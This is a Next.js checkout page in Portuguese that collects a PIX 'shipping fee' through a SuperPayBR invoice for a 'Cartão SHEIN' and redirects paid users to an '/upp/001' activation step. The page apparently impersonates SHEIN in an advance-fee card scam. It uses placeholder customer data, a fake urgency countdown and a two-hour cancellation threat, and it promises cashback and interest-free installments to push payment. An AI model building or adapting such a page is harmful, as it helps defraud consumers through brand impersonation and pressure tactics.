"use client"

import { useState, useEffect, Suspense } from "react"
import { useSearchParams } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Badge } from "@/components/ui/badge"
import { Copy, Clock, CheckCircle, XCircle, AlertCircle, RefreshCw } from "lucide-react"
import { useSuperpayWebhookMonitor } from "@/hooks/use-superpay-webhook-monitor"

// Estados visuais no frontend
const statusColors = {
  confirmed: "bg-green-100 text-green-800 border-green-200",
  denied: "bg-red-100 text-red-800 border-red-200",
  expired: "bg-yellow-100 text-yellow-800 border-yellow-200",
  canceled: "bg-gray-100 text-gray-800 border-gray-200",
  refunded: "bg-orange-100 text-orange-800 border-orange-200",
  pending: "bg-blue-100 text-blue-800 border-blue-200",
}

const statusMessages = {
  confirmed: "✅ Pagamento Confirmado!",
  denied: "❌ Pagamento Negado",
  expired: "⏰ Pagamento Vencido",
  canceled: "🚫 Pagamento Cancelado",
  refunded: "🔄 Pagamento Estornado",
  pending: "⏳ Aguardando Pagamento...",
}

const statusIcons = {
  confirmed: CheckCircle,
  denied: XCircle,
  expired: Clock,
  canceled: XCircle,
  refunded: RefreshCw,
  pending: Clock,
}

function CheckoutContent() {
  const searchParams = useSearchParams()
  const amount = searchParams.get("amount") || "34.90"
  const method = searchParams.get("method") || "SEDEX"

  const [paymentStatus, setPaymentStatus] = useState<keyof typeof statusMessages>("pending")
  const [timeLeft, setTimeLeft] = useState(300) // 5 minutos em segundos
  const [externalId, setExternalId] = useState<string>("")
  const [invoiceData, setInvoiceData] = useState<any>(null)
  const [pixCode, setPixCode] = useState("")
  const [qrCodeUrl, setQrCodeUrl] = useState("")
  const [copySuccess, setCopySuccess] = useState(false)
  const [isCreatingInvoice, setIsCreatingInvoice] = useState(false)

  // Hook de monitoramento webhook
  const {
    paymentData,
    isLoading: isMonitoring,
    checkCount,
  } = useSuperpayWebhookMonitor({
    externalId,
    enabled: !!externalId && paymentStatus === "pending",
    interval: 3000, // Verificar a cada 3 segundos
    onPaid: (data) => {
      console.log("🎉 Pagamento confirmado via webhook!", data)
      setPaymentStatus("confirmed")
      setTimeout(() => {
        window.location.href = "/upp/001"
      }, 2000)
    },
    onDenied: (data) => {
      console.log("❌ Pagamento negado via webhook!", data)
      setPaymentStatus("denied")
    },
    onRefunded: (data) => {
      console.log("🔄 Pagamento estornado via webhook!", data)
      setPaymentStatus("refunded")
    },
    onExpired: (data) => {
      console.log("⏰ Pagamento vencido via webhook!", data)
      setPaymentStatus("expired")
    },
    onCanceled: (data) => {
      console.log("🚫 Pagamento cancelado via webhook!", data)
      setPaymentStatus("canceled")
    },
  })

  // Timer visual (5 minutos)
  useEffect(() => {
    if (paymentStatus !== "pending") return

    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          setPaymentStatus("expired")
          return 0
        }
        return prev - 1
      })
    }, 1000)

    return () => clearInterval(timer)
  }, [paymentStatus])

  // Criar fatura PIX
  useEffect(() => {
    if (!externalId) {
      createInvoice()
    }
  }, [])

  const createInvoice = async () => {
    try {
      setIsCreatingInvoice(true)
      console.log("🔄 Criando fatura SuperPayBR...")

      const response = await fetch("/api/superpaybr/create-invoice", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          amount: Number.parseFloat(amount),
          description: `Frete ${method} - Cartão SHEIN`,
          customer: {
            name: "Cliente SHEIN",
            email: "cliente@shein.com",
            document: "00000000000",
          },
        }),
      })

      const data = await response.json()

      if (data.success && data.data) {
        const invoice = data.data
        setInvoiceData(invoice)
        setExternalId(invoice.external_id)
        setPixCode(invoice.payment?.details?.pix_code || "")
        setQrCodeUrl(invoice.payment?.details?.qrcode || "")
        console.log("✅ Fatura criada:", invoice.external_id)
      } else {
        console.error("❌ Erro ao criar fatura:", data.error)
      }
    } catch (error) {
      console.error("❌ Erro na criação da fatura:", error)
    } finally {
      setIsCreatingInvoice(false)
    }
  }

  const copyPixCode = async () => {
    if (pixCode) {
      await navigator.clipboard.writeText(pixCode)
      setCopySuccess(true)
      setTimeout(() => setCopySuccess(false), 2000)
    }
  }

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  const StatusIcon = statusIcons[paymentStatus]

  return (
    <div className="min-h-screen bg-gray-50 py-8">
      <div className="max-w-md mx-auto px-4">
        <Card className="shadow-lg">
          <CardHeader className="text-center">
            <CardTitle className="text-2xl font-bold text-gray-900">Pagamento PIX</CardTitle>
          </CardHeader>

          <CardContent className="space-y-6">
            {/* Status do Pagamento */}
            <div className="text-center">
              <Badge className={`px-4 py-2 text-sm font-medium ${statusColors[paymentStatus]}`}>
                <StatusIcon className="w-4 h-4 mr-2" />
                {statusMessages[paymentStatus]}
              </Badge>
              {isMonitoring && (
                <p className="text-xs text-gray-500 mt-2">
                  Monitorando pagamento via webhook... ({checkCount} verificações)
                </p>
              )}
            </div>

            {/* Aviso de Confirmação */}
            {paymentStatus === "pending" && (
              <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
                <div className="flex items-start">
                  <AlertCircle className="w-5 h-5 text-yellow-600 mt-0.5 mr-3 flex-shrink-0" />
                  <div className="text-sm">
                    <p className="font-medium text-yellow-800">ATENÇÃO! ⚠️</p>
                    <p className="text-yellow-700 mt-1">
                      Para garantir o envio do seu <strong>Cartão SHEIN</strong>, este pagamento deve ser confirmado em
                      até <strong>2 horas</strong>. Após esse prazo, a sua solicitação será automaticamente cancelada,
                      sem custos adicionais.
                    </p>
                    <p className="text-yellow-700 mt-2">
                      Ao confirmar o pagamento do frete, você garante todos os benefícios exclusivos:{" "}
                      <strong>cashback, parcelamento sem juros e uso imediato do cartão</strong>.
                    </p>
                  </div>
                </div>
              </div>
            )}

            {/* Timer */}
            {paymentStatus === "pending" && (
              <div className="text-center">
                <div className="flex items-center justify-center space-x-2">
                  <Clock className="w-5 h-5 text-gray-600" />
                  <span className="text-lg font-mono font-bold text-gray-900">
                    Tempo restante: {formatTime(timeLeft)}
                  </span>
                </div>
              </div>
            )}

            {/* Valor a Pagar */}
            <div className="text-center">
              <p className="text-sm text-gray-600">Valor a pagar</p>
              <p className="text-3xl font-bold text-green-600">R$ {amount}</p>
              <p className="text-sm text-gray-500">Frete {method} - Cartão SHEIN</p>
            </div>

            {/* QR Code */}
            {paymentStatus === "pending" && (
              <div className="text-center">
                {isCreatingInvoice ? (
                  <div className="w-64 h-64 mx-auto bg-gray-100 rounded-lg flex items-center justify-center">
                    <div className="text-center">
                      <RefreshCw className="w-8 h-8 text-gray-400 animate-spin mx-auto mb-2" />
                      <p className="text-sm text-gray-500">Gerando QR Code...</p>
                    </div>
                  </div>
                ) : qrCodeUrl ? (
                  <img
                    src={`https://quickchart.io/qr?text=${encodeURIComponent(pixCode)}&size=250`}
                    alt="QR Code PIX"
                    className="w-64 h-64 mx-auto border rounded-lg"
                    crossOrigin="anonymous"
                  />
                ) : (
                  <div className="w-64 h-64 mx-auto bg-gray-100 rounded-lg flex items-center justify-center">
                    <p className="text-sm text-gray-500">QR Code não disponível</p>
                  </div>
                )}
                <p className="text-sm text-gray-600 mt-2">Escaneie o QR Code com seu app do banco</p>
              </div>
            )}

            {/* Código PIX */}
            {paymentStatus === "pending" && pixCode && (
              <div className="space-y-2">
                <label className="text-sm font-medium text-gray-700">Código PIX (Copia e Cola)</label>
                <div className="flex space-x-2">
                  <Input value={pixCode} readOnly className="font-mono text-xs" />
                  <Button onClick={copyPixCode} variant="outline" size="sm" className="flex-shrink-0 bg-transparent">
                    <Copy className="w-4 h-4" />
                  </Button>
                </div>
                {copySuccess && <p className="text-xs text-green-600">✅ Código copiado!</p>}
              </div>
            )}

            {/* Observação */}
            {paymentStatus === "pending" && (
              <div className="bg-blue-50 border border-blue-200 rounded-lg p-3">
                <p className="text-sm text-blue-800">
                  <strong>Observação:</strong> Após realizar o pagamento, aguarde alguns instantes para a confirmação
                  automática. Você será redirecionado automaticamente quando o pagamento for processado.
                </p>
              </div>
            )}

            {/* Botão de Ação */}
            {paymentStatus === "confirmed" && (
              <Button onClick={() => (window.location.href = "/upp/001")} className="w-full" size="lg">
                Continuar para Ativação
              </Button>
            )}

            {paymentStatus === "denied" && (
              <Button onClick={() => window.location.reload()} variant="outline" className="w-full" size="lg">
                Tentar Novamente
              </Button>
            )}
          </CardContent>
        </Card>

        {/* Debug Info (apenas em desenvolvimento) */}
        {process.env.NODE_ENV === "development" && (
          <Card className="mt-4 bg-gray-100">
            <CardContent className="p-4">
              <h3 className="font-bold text-sm mb-2">Debug Info:</h3>
              <div className="text-xs space-y-1">
                <p>External ID: {externalId || "Não gerado"}</p>
                <p>Status: {paymentStatus}</p>
                <p>Verificações: {checkCount}</p>
                <p>Monitorando: {isMonitoring ? "Sim" : "Não"}</p>
                {paymentData && <p>Último webhook: {JSON.stringify(paymentData, null, 2)}</p>}
              </div>
            </CardContent>
          </Card>
        )}
      </div>
    </div>
  )
}

export default function CheckoutPage() {
  return (
    <Suspense fallback={<div>Carregando...</div>}>
      <CheckoutContent />
    </Suspense>
  )
}
